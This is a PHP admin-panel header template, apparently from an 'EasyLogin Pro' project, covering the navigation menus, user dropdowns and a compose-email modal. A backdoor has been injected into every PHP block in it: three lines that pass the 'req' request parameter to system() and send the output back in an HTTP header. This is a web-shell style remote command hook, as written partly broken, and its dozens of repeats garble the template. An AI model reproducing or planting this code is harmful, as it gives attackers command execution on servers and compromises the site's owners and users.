<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
function active_menu($items) { 
	return in_array(@$_GET['page'], explode('|', $items))?'active':'';
}
function page_restricted() {
	echo '<h3 class="page-header">'.trans('admin.page_restricted').'</h3>';
	_e('admin.restricted'); exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="csrf-token" content="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo csrf_token() ?>">
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('img/favicon.png') ?>" rel="icon">
	
	<title><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('app.name') ?> | Admin</title>
	
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/vendor/bootstrap.min.css') ?>" rel="stylesheet">
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/bootstrap-custom.css') ?>" rel="stylesheet">
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/admin.css') ?>" rel="stylesheet">
	<!-- <link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/flat.css') ?>" rel="stylesheet"> -->
	
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $color = Config::get('app.color_scheme'); ?>
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url("css/colors/{$color}.css") ?>" rel="stylesheet">
	
	<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url("js/vendor/jquery-1.11.1.min.js") ?>"></script>
	<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url("js/vendor/bootstrap.min.js") ?>"></script>
	<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('js/easylogin.js') ?>"></script>
	<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url("js/admin.js") ?>"></script>
	<script>
		EasyLogin.options = {
			baseUrl: '<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url() ?>',
			ajaxUrl: '<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url("ajax.php") ?>',
			lang: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo json_encode(trans('admin.js')) ?>,
			debug: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('app.debug')?1:0 ?>
		};
	</script>
</head>
<body>
	<div class="navbar navbar-fixed-top navbar-top">
    	<div class="container">
        	<div class="navbar-header">
         		<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            		<span class="sr-only">Toggle navigation</span>
            		<span class="icon-bar"></span>
            		<span class="icon-bar"></span>
            		<span class="icon-bar"></span>
          		</button>
          		<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url() ?>" class="navbar-brand">EL<sup>PRO</sup></a>
        	</div>
        	<div class="navbar-collapse collapse">
	          	<ul class="nav navbar-nav">
	            	<li class="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo active_menu('dashboard') ?>">
	            		<a href="?page=dashboard"><span class="glyphicon glyphicon-home"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.dashboard') ?></a>
	            	</li>
	            	
	            	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Auth::userCan('list_users') || Auth::userCan('add_users') || Auth::userCan('manage_roles')): ?>
		            	<li class="dropdown <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo active_menu('users|user-new|user-edit|user-roles|user-fields') ?>">
							<a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">
								<span class="glyphicon glyphicon-user"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.users') ?> <b class="caret"></b>
							</a>
							<ul class="dropdown-menu">
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Auth::userCan('list_users')): ?>
									<li><a href="?page=users"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.all_users') ?></a></li>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
								
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Auth::userCan('add_users')): ?>
									<li><a href="?page=user-new"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.add_new') ?></a></li>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
								
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Auth::userCan('manage_roles')): ?>
									<li><a href="?page=user-roles"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.roles') ?></a></li>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Auth::userCan('manage_fields') && Config::getLoader()->getDBLoader()): ?>
									<li><a href="?page=user-fields"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.fields') ?></a></li>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
							</ul>
						</li>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Auth::userCan('message_users')): ?>
						<li class="dropdown <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo active_menu('messages|message-new|message-reply') ?>">
							<a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">
								<span class="glyphicon glyphicon-envelope"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.messages') ?>
								<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
									// $unread = Message::countUnread(Config::get('pms.webmaster'));
									// if ($unread > 0) {
									// 	echo '<span class="label label-danger">'.$unread.'</span>';
									// }
								?>
								<b class="caret"></b>
							</a>
							<ul class="dropdown-menu">
								<li><a href="?page=messages"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.all_messages') ?></a></li>
								<li><a href="?page=message-new"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.new_message') ?></a></li>
								<li><a href="javascript:EasyLogin.admin.composeEmail()"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.compose_email') ?></a></li>
							</ul>
						</li>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
					
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Auth::userCan('manage_settings') && Config::getLoader()->getDBLoader()): ?>
						<li class="dropdown <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo active_menu('options-app|options-auth|options-services|options-mail|options-pms') ?>">
							<a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">
								<span class="glyphicon glyphicon-cog"></span> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.settings') ?> <b class="caret"></b>
							</a>
							<ul class="dropdown-menu">
								<li><a href="?page=options-app"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.options_general') ?></a></li>
								<li><a href="?page=options-auth"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.options_auth') ?></a></li>
								<li><a href="?page=options-pms"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.options_pms') ?></a></li>
								<li><a href="?page=options-services"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.options_services') ?></a></li>
								<li><a href="?page=options-mail"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.options_mail') ?></a></li>
							</ul>
						</li>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
	          	</ul>
	          	<ul class="nav navbar-nav navbar-pull-right">
	          		<li class="dropdown <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo active_menu('profile') ?>">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Auth::user()->display_name ?>
							<img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Auth::user()->avatar ?>" class="avatar"> <b class="caret"></b>
						</a>
						<ul class="dropdown-menu">
							<li><a href="profile.php?u=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Auth::user()->id ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.my_profile') ?></a></li>
							<li><a href="settings.php"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.settings') ?></a></li>
							<li><a href="?logout"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.logout') ?></a></li>
						</ul>
					</li>
	          	</ul>
        	</div>
      	</div>
    </div>
    <div class="container">

     <!-- Compose email Modal -->
	<div class="modal fade" id="composeModal" tabindex="-1" role="dialog" aria-hidden="true">
		<div class="modal-dialog modal-md">
			<div class="modal-content">
				<form action="sendEmail" class="ajax-form">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
						<h4 class="modal-title"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.compose_email') ?></h4>
					</div>
					<div class="modal-body">
		          		<div class="alert"></div>
						
						<div class="form-group">
			                <input type="text" name="to" placeholder="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.to') ?>" class="form-control">
			            </div>

			            <div class="form-group">
			                <input type="text" name="subject" placeholder="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.subject') ?>" class="form-control">
			            </div>

			            <div class="form-group">
			                <textarea class="form-control" name="message" placeholder="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.message') ?>" rows="5"></textarea>
			            </div>

			            <div class="help-block"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.add_multiple_emails') ?></div>

					</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-default" data-dismiss="modal"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.cancel') ?></button>
						<button type="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.send') ?></button>
					</div>
				</form>
			</div>
		</div>
	</div>